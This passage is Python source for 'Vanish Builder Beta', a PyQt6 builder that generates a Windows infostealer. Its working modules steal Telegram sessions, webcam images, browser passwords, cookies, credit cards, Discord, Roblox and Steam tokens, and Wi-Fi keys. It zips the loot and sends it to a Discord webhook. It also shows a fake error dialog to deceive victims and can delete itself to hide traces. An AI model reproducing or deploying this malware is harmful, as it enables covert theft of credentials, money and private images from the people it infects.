            return buf, "\\n".join(listing)
        """
    ).strip()


def _fn_grab_telegram() -> str:
    return textwrap.dedent(
        """
        def grab_telegram_sessions():
            import io
            import os
            import zipfile

            roots = []
            for user, local, roam in iter_user_dirs():
                for base in (
                    os.path.join(roam, "Telegram Desktop", "tdata"),
                    os.path.join(local, "Telegram Desktop", "tdata"),
                    os.path.join(roam, "AyuGram", "tdata"),
                    os.path.join(local, "AyuGram", "tdata"),
                    os.path.join(roam, "Unigram", "LocalState"),
                ):
                    if os.path.isdir(base):
                        roots.append((user, base))
            keep_names = {
                "key_datas", "usertag", "settings", "map", "prefix", "shortcuts-custom.json",
            }
            keep_ext = (".key", ".s", ".json", ".sqlite", ".config")

            listing = []
            buf = io.BytesIO()
            count = 0
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for user, root in roots:
                    if not os.path.isdir(root):
                        continue
                    for dirpath, dirnames, files in os.walk(root):
                        if dirpath == root:
                            dirnames[:] = [d for d in dirnames if len(d) == 16]
                        else:
                            dirnames[:] = []
                        for fname in files:
                            if count >= 20:
                                break
                            if fname not in keep_names and not fname.endswith(keep_ext):
                                continue
                            fpath = os.path.join(dirpath, fname)
                            try:
                                if os.path.getsize(fpath) > 256 * 1024:
                                    continue
                                data = safe_read_bytes(fpath, 256 * 1024)
                                if data:
                                    zf.writestr(f"{user}_{count}_{fname}", data)
                                    listing.append(fpath)
                                    count += 1
                            except Exception:
                                pass
            if count == 0:
                return None, "No Telegram session files found."
            buf.seek(0)
            return buf, "\\n".join(listing)
        """
    ).strip()


def _fn_grab_webcam() -> str:
    return textwrap.dedent(
        """
        def grab_webcam():
            import io
            try:
                import cv2
            except Exception:
                return None

            backends = (cv2.CAP_DSHOW, cv2.CAP_MSMF, 0)
            for idx in range(1):
                for backend in backends:
                    cap = None
                    try:
                        cap = cv2.VideoCapture(idx, backend) if backend else cv2.VideoCapture(idx)
                        if not cap or not cap.isOpened():
                            continue
                        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                        for _ in range(3):
                            cap.read()
                        ok, frame = cap.read()
                        if not ok or frame is None:
                            continue
                        ok, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                        if not ok:
                            continue
                        buf = io.BytesIO(jpg.tobytes())
                        buf.seek(0)
                        return buf
                    except Exception:
                        pass
                    finally:
                        if cap is not None:
                            cap.release()
            return None
        """
    ).strip()


def _parse_mb_size(raw: str) -> float:
    raw = (raw or "").strip()
    if not raw:
        return 3.0
    try:
        val = float(raw)
    except ValueError:
        return 3.0
    return max(0.1, min(val, 100.0))


def _fn_mb_spoofer(target_mb: float) -> str:
    mb_lit = repr(float(target_mb))
    return textwrap.dedent(
        f"""
        def spoof_zip_megabytes(data):
            import io
            import os
            import zipfile

            target_bytes = int({mb_lit} * 1024 * 1024)
            if not data or target_bytes < 1:
                return data
            try:
                if len(data) >= target_bytes:
                    return data
                rebuilt = io.BytesIO()
                with zipfile.ZipFile(io.BytesIO(data), "r") as src:
                    with zipfile.ZipFile(rebuilt, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as dst:
                        for info in src.infolist():
                            dst.writestr(info, src.read(info.filename))
                base = rebuilt.getvalue()
                if len(base) >= target_bytes:
                    return base
                need = target_bytes - len(base)
                out = io.BytesIO()
                with zipfile.ZipFile(io.BytesIO(base), "r") as src:
                    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as dst:
                        for info in src.infolist():
                            dst.writestr(info, src.read(info.filename))
                        idx = 0
                        chunk = 1024 * 1024
                        while need > 0 and idx < 64:
                            size = min(need, chunk)
                            pad = os.urandom(size)
                            entry = zipfile.ZipInfo(f"_pad/{{idx}}.bin")
                            entry.compress_type = zipfile.ZIP_STORED
                            dst.writestr(entry, pad)
                            need -= size
                            idx += 1
                result = out.getvalue()
                return result if len(result) >= len(data) else data
            except Exception:
                return data
        """
    ).strip()


def _fn_fake_error(title: str, message: str) -> str:
    title_lit = _escape_webhook(title.strip() or "Application Error")
    message_lit = _escape_webhook(message.strip() or "The application was unable to start correctly (0xc000007b).")
    return textwrap.dedent(
        f"""
        def show_fake_error():
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, {message_lit}, {title_lit}, 0x10)
        """
    ).strip()


def _fn_report_engine() -> str:
    return textwrap.dedent(
        """
        import datetime
        import io
        import threading
        import time
        import zipfile

        class ReportBundle:
            def __init__(self):
                self._entries = []
                self._lock = threading.Lock()
                self._skip = (
                    "no ", "could not", "clipboard empty", "not found",
                    "not available", "empty run",
                )

            def _keep_text(self, text):
                text = str(text or "").strip()
                if len(text) < 3:
                    return ""
                if text.lower().startswith(self._skip):
                    return ""
                return text

            def add_text(self, name, content):
                text = self._keep_text(content)
                if not text:
                    return
                with self._lock:
                    self._entries.append((name, text.encode("utf-8")))

            def add_bytes(self, name, buf):
                if not buf:
                    return
                try:
                    if hasattr(buf, "read"):
                        buf.seek(0)
                        data = buf.read()
                    else:
                        data = bytes(buf)
                    if not data:
                        return
                    with self._lock:
                        self._entries.append((name, data))
                except Exception:
                    pass
                finally:
                    try:
                        if hasattr(buf, "close"):
                            buf.close()
                    except Exception:
                        pass

            def add_zip_tree(self, prefix, zip_buf, manifest=""):
                manifest = self._keep_text(manifest)
                if manifest:
                    with self._lock:
                        self._entries.append((f"{prefix}/manifest.txt", manifest.encode("utf-8")))
                if not zip_buf:
                    return
                try:
                    zip_buf.seek(0)
                    with zipfile.ZipFile(zip_buf, "r") as zf:
                        for info in zf.infolist():
                            if info.is_dir():
                                continue
                            try:
                                data = zf.read(info.filename)
                                if data:
                                    with self._lock:
                                        self._entries.append((f"{prefix}/{info.filename}", data))
                            except Exception:
                                pass
                except Exception:
                    pass
                finally:
                    try:
                        zip_buf.close()
                    except Exception:
                        pass

            def finalize(self):
                with self._lock:
                    if not self._entries:
                        return None, ""
                    names = [n for n, _ in self._entries]
                    buf = io.BytesIO()
                    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as zf:
                        for fname, data in self._entries:
                            zf.writestr(fname, data)
                        stamp = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
                        meta = f"vanish report\\n time: {stamp}\\n files: {len(names)}\\n\\n" + "\\n".join(names)
                        zf.writestr("_report.txt", meta.encode("utf-8"))
                    buf.seek(0)
                    summary = f"{len(names)} files\\n" + "\\n".join(names[:20])
                    if len(names) > 20:
                        summary += f"\\n...+{len(names) - 20} more"
                    return buf.getvalue(), summary

        def _run_collection_job(bundle, spec):
            name, kind, fn = spec
            try:
                result = fn()
                if kind == "text":
                    bundle.add_text(name, result)
                elif kind == "bytes":
                    bundle.add_bytes(name, result)
                elif kind == "files_zip":
                    if result and isinstance(result, tuple):
                        zbuf, manifest = result[0], result[1] if len(result) > 1 else ""
                    else:
                        zbuf, manifest = result, ""
                    bundle.add_zip_tree(name.rstrip("/"), zbuf, manifest or "")
            except Exception as e:
                pass

        def run_collection(jobs, bundle):
            if not jobs:
                return
                
            threads = []
            for spec in jobs:
                t = threading.Thread(target=_run_collection_job, args=(bundle, spec), daemon=True)
                t.start()
                threads.append(t)
                
            start_time = time.time()
            for t in threads:
                remain = 25.0 - (time.time() - start_time)
                if remain > 0:
                    t.join(timeout=remain)

        def send_hit_report(zip_data, summary=""):
            msg = "@everyone vanish got a hit"
            if summary:
                msg += "\\n```\\n" + str(summary)[:1800] + "\\n```"
            send_webhook(msg, files={"file": ("loot.zip", zip_data, "application/zip")})
        """
    ).strip()


def _collect_jobs(**flags) -> list[str]:
    mapping = [
        ("system_info", "('system/info.txt', 'text', grab_system_info)"),
        ("grab_network", "('network/adapters.txt', 'text', grab_network_info)"),
        ("grab_startup", "('system/startup.txt', 'text', grab_startup_items)"),
        ("screenshot", "('screen/screenshot.png', 'bytes', grab_screenshot)"),
        ("grab_webcam", "('webcam/capture.png', 'bytes', grab_webcam)"),
        ("grab_processes", "('system/processes.txt', 'text', grab_processes)"),
        ("grab_apps", "('system/apps.txt', 'text', grab_installed_apps)"),
        ("grab_wifi", "('network/wifi.txt', 'text', grab_wifi_passwords)"),
        ("grab_history", "('browsers/history.txt', 'text', grab_browser_history)"),
        ("grab_bookmarks", "('browsers/bookmarks.txt', 'text', grab_bookmarks)"),
        ("grab_passwords", "('browsers/passwords.txt', 'text', grab_browser_passwords)"),
        ("grab_cookies", "('browsers/cookies.txt', 'text', grab_browser_cookies)"),
        ("grab_autofill", "('browsers/autofill.txt', 'text', grab_autofill)"),
        ("grab_credit_cards", "('browsers/cards.txt', 'text', grab_credit_cards)"),
        ("grab_discord", "('tokens/discord.txt', 'text', grab_discord_tokens)"),
        ("grab_roblox", "('tokens/roblox.txt', 'text', grab_roblox_cookies)"),
        ("grab_steam", "('games/steam.txt', 'text', grab_steam_data)"),
        ("grab_telegram", "('telegram', 'files_zip', grab_telegram_sessions)"),
        ("grab_files", "('files', 'files_zip', grab_interesting_files)"),
    ]
    return [spec for key, spec in mapping if flags.get(key)]


def generate_client(
    webhook: str,
    *,
    system_info: bool = False,
    screenshot: bool = False,
    grab_network: bool = False,
    grab_startup: bool = False,
    grab_history: bool = False,
    grab_bookmarks: bool = False,
    grab_wifi: bool = False,
    grab_passwords: bool = False,
    grab_cookies: bool = False,
    grab_autofill: bool = False,
    grab_credit_cards: bool = False,
    grab_discord: bool = False,
    grab_roblox: bool = False,
    grab_steam: bool = False,
    grab_processes: bool = False,
    grab_apps: bool = False,
    grab_files: bool = False,
    grab_telegram: bool = False,
    grab_webcam: bool = False,
    self_delete: bool = False,
    mb_spoofer: bool = False,
    mb_spoofer_size: float = 3.0,
    fake_error: bool = False,
    fake_error_title: str = "Application Error",
    fake_error_message: str = "The application was unable to start correctly (0xc000007b).",
) -> str:
    webhook_lit = _escape_webhook(webhook.strip())

    opts = {
        "system_info": system_info,
        "grab_network": grab_network,
        "grab_startup": grab_startup,
        "screenshot": screenshot,
        "grab_webcam": grab_webcam,
        "grab_processes": grab_processes,
        "grab_apps": grab_apps,
        "grab_wifi": grab_wifi,
        "grab_history": grab_history,
        "grab_bookmarks": grab_bookmarks,
        "grab_passwords": grab_passwords,
        "grab_cookies": grab_cookies,
        "grab_autofill": grab_autofill,
        "grab_credit_cards": grab_credit_cards,
        "grab_discord": grab_discord,
        "grab_roblox": grab_roblox,
        "grab_steam": grab_steam,
        "grab_files": grab_files,
        "grab_telegram": grab_telegram,
    }

    chromium = grab_passwords or grab_cookies or grab_credit_cards or grab_roblox

    helpers: list[str] = [_fn_stealth_utils()]
    if chromium:
        helpers.append(_fn_chromium_core())
    if mb_spoofer:
        helpers.append(_fn_mb_spoofer(mb_spoofer_size))
    if fake_error:
        helpers.append(_fn_fake_error(fake_error_title, fake_error_message))

    helper_map = [
        ("system_info", system_info, _fn_system_info),
        ("grab_network", grab_network, _fn_grab_network),
        ("grab_startup", grab_startup, _fn_grab_startup),
        ("screenshot", screenshot, _fn_screenshot),
        ("grab_webcam", grab_webcam, _fn_grab_webcam),
        ("grab_history", grab_history, _fn_grab_history),
        ("grab_bookmarks", grab_bookmarks, _fn_grab_bookmarks),
        ("grab_wifi", grab_wifi, _fn_grab_wifi),
        ("grab_passwords", grab_passwords, _fn_grab_passwords),
        ("grab_cookies", grab_cookies, _fn_grab_cookies),
        ("grab_autofill", grab_autofill, _fn_grab_autofill),
        ("grab_credit_cards", grab_credit_cards, _fn_grab_credit_cards),
        ("grab_discord", grab_discord, _fn_grab_discord),
        ("grab_roblox", grab_roblox, _fn_grab_roblox),
        ("grab_steam", grab_steam, _fn_grab_steam),
        ("grab_processes", grab_processes, _fn_grab_processes),
        ("grab_apps", grab_apps, _fn_grab_apps),
        ("grab_files", grab_files, _fn_grab_files),
        ("grab_telegram", grab_telegram, _fn_grab_telegram),
    ]
    for _name, enabled, factory in helper_map:
        if enabled:
            helpers.append(factory())

    jobs = _collect_jobs(**opts)
    if jobs:
        helpers.append(_fn_report_engine())

    run_lines: list[str] = []

    if fake_error:
        run_lines.append("show_fake_error()")

    if jobs:
        run_lines.append("bundle = ReportBundle()")
        run_lines.append("_jobs = [")
        run_lines.extend(f"    {job}," for job in jobs)
        run_lines.append("]")
        run_lines.append("run_collection(_jobs, bundle)")
        run_lines.append("zip_data, summary = bundle.finalize()")
        run_lines.append("if zip_data:")
        if mb_spoofer:
            run_lines.append("    zip_data = spoof_zip_megabytes(zip_data)")
        run_lines.append("    send_hit_report(zip_data, summary)")
        run_lines.append("else:")
        run_lines.append("    send_webhook('@everyone vanish got a hit\\n```\\nno data collected\\n```')")
    else:
        run_lines.append("send_webhook('@everyone vanish got a hit\\n```\\nno modules enabled\\n```')")

    helpers_block = "\n\n\n".join(helpers)
    main_body = textwrap.indent("\n".join(run_lines), "        ")
    finally_lines = ["        cleanup_traces()"]
    if self_delete:
        finally_lines.append("        self_delete()")

    parts = [
        "import json",
        "import sys",
        "",
        f"WEBHOOK = {webhook_lit}",
        "",
        "def send_webhook(content, files=None):",
        "    import requests",
        "    import json",
        "    s = requests.Session()",
        '    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
        "    try:",
        "        if files:",
        '            payload = {"content": (content or "")[:1900]}',
        '            r = s.post(WEBHOOK, data={"payload_json": json.dumps(payload)}, files=files, timeout=60)',
        "        else:",
        "            text = (content or '')[:1900]",
        '            r = s.post(WEBHOOK, json={"content": text}, timeout=30)',
        "        return r.status_code in (200, 204)",
        "    except Exception:",
        "        return False",
        "    finally:",
        "        s.close()",
    ]

    if helpers_block:
        parts.extend(["", helpers_block])

    parts.extend([
        "",
        "def main():",
        "    try:",
        main_body if main_body.strip() else "        pass",
        "    except Exception:",
        "        pass",
        "    finally:",
        *finally_lines,
        "    return 0",
        "",
        'if __name__ == "__main__":',
        "    try:",
        "        sys.exit(main())",
        "    except Exception:",
        "        pass",
        "    finally:",
        "        cleanup_traces()",
        "        import os",
        "        os._exit(0)",
        "",
    ])

    return "\n".join(parts)


def write_client_source(
    out_path: Path,
    webhook: str,
    **options,
) -> Path:
    src = generate_client(webhook, **options)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(src, encoding="utf-8")
    return out_path


MODULE_CATEGORIES = [
    ("System", [
        ("system", "System Info"),
        ("network", "Network Info"),
        ("startup", "Startup Programs"),
        ("screenshot", "Screenshot"),
        ("webcam", "Webcam Image"),
        ("processes", "All Processes"),
        ("apps", "Installed Programs"),
    ]),
    ("Stealers", [
        ("wifi", "Network Grabber"),
        ("history", "Broswer History"),
        ("bookmarks", "Browser Bookmarks"),
        ("passwords", "Password Stealer"),
        ("cookies", "Cookie Grabber"),
        ("autofill", "AutoFill Grabber"),
        ("cards", "Credit-Card Grabber"),
        ("discord", "Discord Tokens"),
        ("roblox", "Roblox Grabber"),
        ("steam", "Steam Grabber"),
        ("telegram", "Telegram Grabber"),
        ("files", "System File Scanners"),
    ]),
    ("Protection", [
        ("selfdel", "Self Destruct"),
    ]),
    ("Builder", [
        ("mb_spoofer", "Megabyte Spoofer"),
        ("fake_error", "Fake Error"),
    ]),
]

OPTION_KEYS = {
    "system": "system_info",
    "network": "grab_network",
    "startup": "grab_startup",
    "screenshot": "screenshot",
    "webcam": "grab_webcam",
    "processes": "grab_processes",
    "apps": "grab_apps",
    "wifi": "grab_wifi",
    "history": "grab_history",
    "bookmarks": "grab_bookmarks",
    "passwords": "grab_passwords",
    "cookies": "grab_cookies",
    "autofill": "grab_autofill",
    "cards": "grab_credit_cards",
    "discord": "grab_discord",
    "roblox": "grab_roblox",
    "steam": "grab_steam",
    "telegram": "grab_telegram",
    "files": "grab_files",
    "selfdel": "self_delete",
    "mb_spoofer": "mb_spoofer",
    "fake_error": "fake_error",
}


class DependencyChecker(QThread):
    progress = pyqtSignal(str, int)
    finished_check = pyqtSignal()

    def run(self):
        packages = {
            "requests": "requests",
            "PIL": "Pillow",
            "Cryptodome": "pycryptodomex",
            "cv2": "opencv-python",
            "PyInstaller": "pyinstaller",
            "PyQt6": "PyQt6",
        }
        
        total = len(packages)
        for i, (module, pip_name) in enumerate(packages.items()):
            self.progress.emit(f"Checking {pip_name}...", int((i / total) * 100))
            if importlib.util.find_spec(module) is None:
                self.progress.emit(f"Installing {pip_name}...", int((i / total) * 100))
                subprocess.run([PYTHON_EXE, "-m", "pip", "install", pip_name], 
                               capture_output=True)
        
        self.progress.emit("Starting Builder...", 100)
        self.msleep(500)
        self.finished_check.emit()


class LoadingScreen(QWidget):
    def __init__(self):
        super().__init__()
        self._drag_pos = None
        self.setFixedSize(400, 200)
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        
        container = QWidget()
        container.setStyleSheet('''
            QWidget {
                background-color: #09090b;
                border: 1px solid #27272a;
                border-radius: 12px;
                font-family: 'Segoe UI';
            }
        ''')
        
        c_layout = QVBoxLayout(container)
        c_layout.setContentsMargins(30, 40, 30, 40)
        
        title = QLabel("Vanish Builder Beta")
        title.setStyleSheet("font-size: 22px; font-weight: bold; color: #a1a1aa; border: none; background: transparent;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        c_layout.addWidget(title)
        
        self.status_label = QLabel("Initializing...")
        self.status_label.setStyleSheet("color: #71717a; font-size: 13px; border: none; background: transparent;")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        c_layout.addWidget(self.status_label)
        
        c_layout.addSpacing(10)
        self.progress_bar = QProgressBar()
        self.progress_bar.setFixedHeight(6)
        self.progress_bar.setTextVisible(False)
        self.progress_bar.setStyleSheet('''
            QProgressBar {
                background-color: #18181b;
                border: none;
                border-radius: 3px;
            }
            QProgressBar::chunk {
                background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #6366f1, stop:1 #8b5cf6);
                border-radius: 3px;
            }
        ''')
        c_layout.addWidget(self.progress_bar)
        
        layout.addWidget(container)
        
        self.checker = DependencyChecker()
        self.checker.progress.connect(self.update_progress)
        self.checker.start()
        
    def update_progress(self, text, value):
        self.status_label.setText(text)
        self.progress_bar.setValue(value)

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self._drag_pos = event.globalPosition().toPoint()

    def mouseMoveEvent(self, event):
        if self._drag_pos is not None and event.buttons() == Qt.MouseButton.LeftButton:
            diff = event.globalPosition().toPoint() - self._drag_pos
            self.move(self.pos() + diff)
            self._drag_pos = event.globalPosition().toPoint()

    def mouseReleaseEvent(self, event):
        self._drag_pos = None


class ToggleSwitch(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(48, 26)
        self._checked = False
        self._position = 4
        self.anim = QPropertyAnimation(self, b"position")
        self.anim.setDuration(250)
        self.anim.setEasingCurve(QEasingCurve.Type.InOutBack)

    @pyqtProperty(int)
    def position(self):
        return self._position

    @position.setter
    def position(self, pos):
        self._position = pos
        self.update()

    def isChecked(self):
        return self._checked

    def setChecked(self, checked):
        self._checked = checked
        self._position = 24 if checked else 4
        self.update()

    def mouseReleaseEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self._checked = not self._checked
            self.anim.setStartValue(24 if not self._checked else 4)
            self.anim.setEndValue(24 if self._checked else 4)
            self.anim.start()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        bg_color = QColor("#6366f1") if self._checked else QColor("#27272a")
        painter.setBrush(QBrush(bg_color))
        painter.setPen(Qt.PenStyle.NoPen)
        painter.drawRoundedRect(0, 0, self.width(), self.height(), 13, 13)
        
        painter.setBrush(QBrush(QColor(0, 0, 0, 50)))
        painter.drawEllipse(self._position + 1, 5, 20, 20)
        
        painter.setBrush(QBrush(QColor("#ffffff")))
        painter.drawEllipse(self._position, 4, 18, 18)
        painter.end()


class TitleBar(QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.setFixedHeight(40)
        self.setStyleSheet("background-color: #09090b; border-top-left-radius: 12px; border-top-right-radius: 12px;")
        
        layout = QHBoxLayout(self)
        layout.setContentsMargins(15, 0, 0, 0)
        
        title = QLabel("Vanish Builder Beta")
        title.setStyleSheet("color: #a1a1aa; font-weight: bold; font-size: 13px; font-family: 'Segoe UI'; border: none;")
        
        min_btn = QPushButton("—")
        close_btn = QPushButton("✕")
        
        for btn in (min_btn, close_btn):
            btn.setFixedSize(45, 40)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.setStyleSheet('''
                QPushButton { background: transparent; color: #a1a1aa; border: none; font-size: 14px; font-weight: bold; }
                QPushButton:hover { background: #27272a; color: white; border-top-right-radius: 12px; }
            ''')
            
        close_btn.setStyleSheet('''
            QPushButton { background: transparent; color: #a1a1aa; border: none; font-size: 14px; font-weight: bold; }
            QPushButton:hover { background: #ef4444; color: white; border-top-right-radius: 12px; }
        ''')
        min_btn.setStyleSheet('''
            QPushButton { background: transparent; color: #a1a1aa; border: none; font-size: 14px; font-weight: bold; }
            QPushButton:hover { background: #27272a; color: white; }
        ''')
        
        min_btn.clicked.connect(self.parent.showMinimized)
        close_btn.clicked.connect(QApplication.quit)
        
        layout.addWidget(title)
        layout.addStretch()
        layout.addWidget(min_btn)
        layout.addWidget(close_btn)
        
        self._drag_pos = None

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self._drag_pos = event.globalPosition().toPoint()

    def mouseMoveEvent(self, event):
        if self._drag_pos is not None and event.buttons() == Qt.MouseButton.LeftButton:
            diff = event.globalPosition().toPoint() - self._drag_pos
            self.parent.move(self.parent.pos() + diff)
            self._drag_pos = event.globalPosition().toPoint()

    def mouseReleaseEvent(self, event):
        self._drag_pos = None


class BuilderApp(QMainWindow):
    test_done_signal = pyqtSignal(bool)
    compile_done_signal = pyqtSignal(bool, str)

    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setFixedSize(850, 600)
        
        main_container = QWidget()
        main_container.setObjectName("MainContainer")
        main_container.setStyleSheet('''
            #MainContainer {
                background-color: #09090b;
                border: 1px solid #27272a;
                border-radius: 12px;
            }
            QWidget {
                font-family: 'Segoe UI', sans-serif;
            }
        ''')
        self.setCentralWidget(main_container)
        
        layout = QVBoxLayout(main_container)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        
        self.title_bar = TitleBar(self)
        layout.addWidget(self.title_bar)
        
        content_layout = QHBoxLayout()
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(0)
        
        self.sidebar = QListWidget()
        self.sidebar.setFixedWidth(220)
        self.sidebar.setCursor(Qt.CursorShape.PointingHandCursor)
        self.sidebar.setStyleSheet('''
            QListWidget {
                background-color: #09090b;
                border: none;
                border-right: 1px solid #27272a;
                padding-top: 15px;
                outline: none;
            }
            QListWidget::item {
                color: #a1a1aa;
                padding: 12px 20px;
                margin: 4px 16px;
                border-radius: 8px;
                font-size: 14px;
                font-weight: 600;
            }
            QListWidget::item:hover {
                background-color: #18181b;
                color: #e4e4e7;
            }
            QListWidget::item:selected {
                background-color: #27272a;
                color: #ffffff;
            }
        ''')
        
        self.stack = QStackedWidget()
        self.stack.setStyleSheet("background-color: #09090b; border: none;")
        
        self.toggles = {}
        
        for cat_name, modules in MODULE_CATEGORIES:
            self.sidebar.addItem(cat_name)
            
            scroll = QScrollArea()
            scroll.setWidgetResizable(True)
            scroll.setStyleSheet('''
                QScrollArea { border: none; background: transparent; }
                QScrollBar:vertical {
                    border: none;
                    background: #09090b;
                    width: 6px;
                    border-radius: 3px;
                }
                QScrollBar::handle:vertical {
                    background: #3f3f46;
                    border-radius: 3px;
                    min-height: 20px;
                }
                QScrollBar::handle:vertical:hover { background: #52525b; }
                QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { border: none; background: none; }
            ''')
            
            page = QWidget()
            page.setStyleSheet("background: transparent;")
            if cat_name == "Builder":
                outer_layout = QVBoxLayout(page)
                outer_layout.setContentsMargins(35, 30, 35, 30)
                outer_layout.setSpacing(20)
                page_layout = QGridLayout()
                outer_layout.addLayout(page_layout)
            else:
                page_layout = QGridLayout(page)
                page_layout.setContentsMargins(35, 30, 35, 30)
                page_layout.setSpacing(20)
                outer_layout = None
            
            for i, (key, name) in enumerate(modules):
                row, col = divmod(i, 2)
                item = QWidget()
                item.setStyleSheet('''
                    QWidget {
                        background-color: #18181b;
                        border: 1px solid #27272a;
                        border-radius: 10px;
                    }
                    QWidget:hover {
                        border-color: #3f3f46;
                    }
                ''')
                hlay = QHBoxLayout(item)
                hlay.setContentsMargins(18, 14, 18, 14)
                
                lbl = QLabel(name)
                lbl.setStyleSheet("color: #e4e4e7; border: none; background: transparent; font-weight: 600; font-size: 13px;")
                
                tog = ToggleSwitch(item)
                tog.setStyleSheet("border: none; background: transparent;")
                self.toggles[key] = tog
                
                hlay.addWidget(lbl)
                hlay.addStretch()
                hlay.addWidget(tog)
                
                page_layout.addWidget(item, row, col)
                
            if cat_name == "Builder":
                custom_box = QWidget()
                custom_box.setStyleSheet('''
                    QWidget {
                        background-color: #18181b;
                        border: 1px solid #27272a;
                        border-radius: 10px;
                    }
                ''')
                custom_layout = QVBoxLayout(custom_box)
                custom_layout.setContentsMargins(18, 16, 18, 16)
                custom_layout.setSpacing(10)

                mb_lbl = QLabel("Megabyte Spoofer Size (MB)")
                mb_lbl.setStyleSheet("color: #a1a1aa; border: none; background: transparent; font-size: 12px; font-weight: 600;")
                self.mb_spoofer_size = QLineEdit()
                self.mb_spoofer_size.setPlaceholderText("3.0")
                self.mb_spoofer_size.setFixedHeight(38)
                self.mb_spoofer_size.setStyleSheet('''
                    QLineEdit {
                        background-color: #09090b;
                        border: 1px solid #27272a;
                        border-radius: 8px;
                        padding: 0 12px;
                        color: white;
                        font-size: 13px;
                    }
                    QLineEdit:focus { border: 1px solid #6366f1; }
                ''')

                title_lbl = QLabel("Fake Error Title")
                title_lbl.setStyleSheet("color: #a1a1aa; border: none; background: transparent; font-size: 12px; font-weight: 600;")
                self.fake_error_title = QLineEdit()
                self.fake_error_title.setPlaceholderText("Application Error")
                self.fake_error_title.setFixedHeight(38)
                self.fake_error_title.setStyleSheet('''
                    QLineEdit {
                        background-color: #09090b;
                        border: 1px solid #27272a;
                        border-radius: 8px;
                        padding: 0 12px;
                        color: white;
                        font-size: 13px;
                    }
                    QLineEdit:focus { border: 1px solid #6366f1; }
                ''')

                msg_lbl = QLabel("Fake Error Message")
                msg_lbl.setStyleSheet("color: #a1a1aa; border: none; background: transparent; font-size: 12px; font-weight: 600;")
                self.fake_error_message = QTextEdit()
                self.fake_error_message.setPlaceholderText("The application was unable to start correctly (0xc000007b).")
                self.fake_error_message.setFixedHeight(70)
                self.fake_error_message.setStyleSheet('''
                    QTextEdit {
                        background-color: #09090b;
                        border: 1px solid #27272a;
                        border-radius: 8px;
                        padding: 8px 12px;
                        color: white;
                        font-size: 13px;
                    }
                    QTextEdit:focus { border: 1px solid #6366f1; }
                ''')

                custom_layout.addWidget(mb_lbl)
                custom_layout.addWidget(self.mb_spoofer_size)
                custom_layout.addWidget(title_lbl)
                custom_layout.addWidget(self.fake_error_title)
                custom_layout.addWidget(msg_lbl)
                custom_layout.addWidget(self.fake_error_message)
                outer_layout.addWidget(custom_box)
                outer_layout.addStretch()
            else:
                page_layout.setRowStretch(page_layout.rowCount(), 1)
            scroll.setWidget(page)
            self.stack.addWidget(scroll)
            
        self.sidebar.currentRowChanged.connect(self.stack.setCurrentIndex)
        self.sidebar.setCurrentRow(0)
        
        content_layout.addWidget(self.sidebar)
        content_layout.addWidget(self.stack)
        layout.addLayout(content_layout)
        
        bot_bar = QWidget()
        bot_bar.setFixedHeight(85)
        bot_bar.setStyleSheet('''
            QWidget {
                background-color: #09090b;
                border-top: 1px solid #27272a;
                border-bottom-left-radius: 12px;
                border-bottom-right-radius: 12px;
            }
        ''')
        bot_layout = QHBoxLayout(bot_bar)
        bot_layout.setContentsMargins(25, 0, 25, 0)
        
        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("Enter Discord Webhook URL...")
        self.webhook_input.setFixedHeight(45)
        self.webhook_input.setStyleSheet('''
            QLineEdit {
                background-color: #18181b;
                border: 1px solid #27272a;
                border-radius: 8px;
                padding: 0 15px;
                color: white;
                font-size: 13px;
                selection-background-color: #6366f1;
            }
            QLineEdit:focus { border: 1px solid #6366f1; }
        ''')
        
        self.test_btn = QPushButton("Test")
        self.test_btn.setFixedSize(70, 45)
        self.test_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.test_btn.setStyleSheet('''
            QPushButton {
                background-color: #18181b;
                border: 1px solid #27272a;
                border-radius: 8px;
                color: #a1a1aa;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #27272a; color: white; }
        ''')
        self.test_btn.clicked.connect(self.test_webhook)
        
        self.compile_btn = QPushButton("Build Payload")
        self.compile_btn.setFixedSize(140, 45)
        self.compile_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.compile_btn.setStyleSheet('''
            QPushButton {
                background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #6366f1, stop:1 #8b5cf6);
                border: none;
                border-radius: 8px;
                color: white;
                font-weight: bold;
                font-size: 14px;
            }
